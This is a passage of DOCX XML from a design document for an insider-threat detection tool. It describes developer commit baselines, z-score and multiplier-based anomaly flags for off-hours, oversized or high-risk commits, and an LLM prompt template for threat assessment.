            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Size</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>avg_additions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Mean lines added per commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Size</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>avg_deletions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Mean lines deleted per commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Size</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>avg_files_changed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Mean files changed per commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Size</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>p90_additions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>90th percentile of lines added</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Size</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>p90_deletions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>90th percentile of lines deleted</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Risk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>avg_risk_score</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Mean historical risk score</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Activity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>avg_commits_per_week</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commits / (span_days / 7)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 Baseline Status Levels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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commit Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Capabilities</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>insufficient</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>&lt; 5 commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>No anomaly detection active</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>partial</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>5-19 commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Basic hour range check (low severity only)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>established</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>&gt;= 20 commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Full z-score analysis, all anomaly types active</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 Baseline Computation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Baselines are recomputed after every new commit scan using the most recent 60 commits (BASELINE_WINDOW=60). The computation uses an UPSERT pattern - creating the baseline on first commit or updating the existing one.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Configuration Constants</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>MIN_COMMITS_PARTIAL = 5       # Basic baseline activation</w:t>
        <w:br/>
        <w:t>MIN_COMMITS_ESTABLISHED = 20  # Full confidence baseline</w:t>
        <w:br/>
        <w:t>BASELINE_WINDOW = 60          # Rolling window size</w:t>
        <w:br/>
        <w:t>SIZE_MULTIPLIER = 5.0         # Flag if &gt; 5x baseline avg</w:t>
        <w:br/>
        <w:t>SIZE_MIN_BASELINE = 20        # Minimum avg to avoid noise</w:t>
        <w:br/>
        <w:t>TIMING_Z_MEDIUM = 2.0         # Z-score for medium severity</w:t>
        <w:br/>
        <w:t>TIMING_Z_HIGH = 3.0           # Z-score for high severity</w:t>
        <w:br/>
        <w:t>RISK_MULTIPLIER = 3.0         # Flag if risk &gt; 3x baseline</w:t>
        <w:br/>
        <w:t>RISK_MIN_SCORE = 2.5          # Minimum score to flag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Code: Baseline Computation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>def compute_and_store(self, author_email: str) -&gt; Dict:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Fetch last 60 commits for this developer</w:t>
        <w:br/>
        <w:t xml:space="preserve">    SELECT committed_at, additions, deletions, files_changed, risk_score</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FROM github_commit_scans</w:t>
        <w:br/>
        <w:t xml:space="preserve">    WHERE author_email = ?</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ORDER BY committed_at DESC LIMIT 60</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # Determine status based on count</w:t>
        <w:br/>
        <w:t xml:space="preserve">    status = "insufficient" if n &lt; 5 else "partial" if n &lt; 20 else "established"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # Timing: extract UTC hours, compute mean/std</w:t>
        <w:br/>
        <w:t xml:space="preserve">    mean_hour = mean(hours)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    std_hour = max(std(hours), 1.0)  # Floor at 1 to avoid div-by-zero</w:t>
        <w:br/>
        <w:t xml:space="preserve">    hour_start = max(0, int(mean_hour - 1.5 * std_hour))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    hour_end = min(23, int(mean_hour + 1.5 * std_hour))</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # Size: mean and P90 for additions, deletions, files</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Risk: mean of historical risk scores</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Activity: commits / (span_days / 7.0)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # UPSERT into github_developer_baselines</w:t>
        <w:br/>
        <w:t xml:space="preserve">    INSERT ... ON CONFLICT(author_email) DO UPDATE SET ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Stage 4 - Anomaly Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Anomaly detection compares each new commit against the developer's pre-update baseline. This is critical - the comparison happens BEFORE the baseline is recomputed with the new commit, ensuring the new commit is measured against the established normal behavior.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Detection Flow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>1. New commit scanned -&gt; CommitAnalysisResult generated</w:t>
        <w:br/>
        <w:t>2. detect_and_store() called with commit metrics</w:t>
        <w:br/>
        <w:t>3. Load CURRENT baseline (before update)</w:t>
        <w:br/>
        <w:t>4. Compare commit vs baseline for each anomaly type</w:t>
        <w:br/>
        <w:t>5. Store detected anomalies in github_developer_anomalies</w:t>
        <w:br/>
        <w:t>6. THEN compute_and_store() updates baseline with new commit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 Off-Hours Deviation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Detects when a developer commits outside their established normal working hours.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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Baseline Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Method</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>established (&gt;=20)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Z-score = |hour - mean_hour| / std_hour</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Medium if z &gt;= 2.0, High if z &gt;= 3.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>partial (5-19)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Simple range: hour &lt; start or hour &gt; end</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>insufficient (&lt;5)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>No detection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Code: Off-Hours Z-Score Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t># Established baseline: z-score analysis</w:t>
        <w:br/>
        <w:t>hour = committed_at.hour</w:t>
        <w:br/>
        <w:t>mean_h = baseline["mean_commit_hour"]</w:t>
        <w:br/>
        <w:t>std_h = max(baseline["std_commit_hour"], 1.0)</w:t>
        <w:br/>
        <w:t>z = abs(hour - mean_h) / std_h</w:t>
        <w:br/>
        <w:br/>
        <w:t>if z &gt;= 3.0:  severity = "high"</w:t>
        <w:br/>
        <w:t>elif z &gt;= 2.0: severity = "medium"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Example: Developer normally commits 9-17 (mean=13, std=2)</w:t>
        <w:br/>
        <w:t># Commit at 3:00 AM -&gt; z = |3-13|/2 = 5.0 -&gt; HIGH severity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 Large Commit Size</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Flags commits where lines added or deleted exceed 5x the developer's baseline average. Only activates when the baseline average is &gt; 20 lines to avoid false positives on developers who typically make small commits.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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Threshold</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>large_commit_additions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>additions &gt; 5x avg_additions (if avg &gt; 20)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>High if ratio &gt; 10x, else Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>large_commit_deletions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>deletions &gt; 5x avg_deletions (if avg &gt; 20)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>High if ratio &gt; 10x, else Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 Risk Spike</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Flags when a commit's risk score is more than 3x the developer's average risk score. Only triggers if the new score is &gt;= 2.5 (meaningful risk) and baseline avg &gt; 0.5.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t># Risk spike detection</w:t>
        <w:br/>
        <w:t>avg_risk = baseline["avg_risk_score"]</w:t>
        <w:br/>
        <w:t>if avg_risk &gt; 0.5 and risk_score &gt;= 2.5 and risk_score &gt; avg_risk * 3.0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ALWAYS high severity</w:t>
        <w:br/>
        <w:t xml:space="preserve">    anomaly: "risk_spike"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    description: f"Risk score {risk_score} - {ratio}x above baseline ({avg_risk})"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Stage 5 - AI Threat Assessment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The AI threat assessment is an on-demand analysis triggered by security analysts when they want a deeper investigation of a specific commit. It uses the platform's configurable AI backend (any supported LLM provider) to perform intent analysis.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 Prompt Engineering</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>System Prompt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>SYSTEM: "You are a cybersecurity expert specializing in insider threat analysis. Respond only with valid JSON."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>User Prompt Template</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>You are a senior application security analyst specializing in insider threat detection.</w:t>
        <w:br/>
        <w:br/>
        <w:t>Analyze the following git commit and provide a structured threat assessment.</w:t>
        <w:br/>
        <w:br/>
        <w:t>## Commit Details</w:t>
        <w:br/>
        <w:t>- **Repository**: {repo_full_name}</w:t>
        <w:br/>
        <w:t>- **SHA**: {sha[:12]}</w:t>
        <w:br/>
        <w:t>- **Author**: {author_name} &lt;{author_email}&gt;</w:t>
        <w:br/>
        <w:t>- **Committer**: {committer_name} &lt;{committer_email}&gt;</w:t>
        <w:br/>
        <w:t>- **Message**: {commit_message}</w:t>
        <w:br/>
        <w:t>- **Committed at**: {committed_at}</w:t>
        <w:br/>
        <w:t>- **Risk Score**: {risk_score}/10 ({risk_level})</w:t>
        <w:br/>
        <w:t>- **Files changed**: {files_changed} (+{additions} / -{deletions} lines)</w:t>
        <w:br/>
        <w:br/>
        <w:t>## Behavioral Signals</w:t>
        <w:br/>
        <w:t>{signal_text}</w:t>
        <w:br/>
        <w:br/>
        <w:t>## SAST Findings ({count} total)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - [{severity}] {rule_name} in {file_path} line {line_number}</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Code: `{matched_text[:300]}`</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Rule: {rule_description}  CWE: {cwe}  OWASP: {owasp}</w:t>
        <w:br/>
        <w:br/>
        <w:t>## Sensitive Files Touched ({count} total)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - {file_path} (matched pattern: {pattern_matched})</w:t>
        <w:br/>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>Respond ONLY with a valid JSON object matching this schema:</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "threat_level": "intentional_insider"|"suspicious"|"negligent"|"false_positive",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "confidence": 0.0-1.0,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "impact_summary": "2-3 sentence description of real-world security impact",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "intent_analysis": "2-3 sentence analysis of intentional vs accidental",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "malicious_scenario": "Most likely attack scenario if malicious (null if &lt; 0.3)",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "key_indicators": ["indicator 1", "indicator 2", ...],</w:t>
        <w:br/>
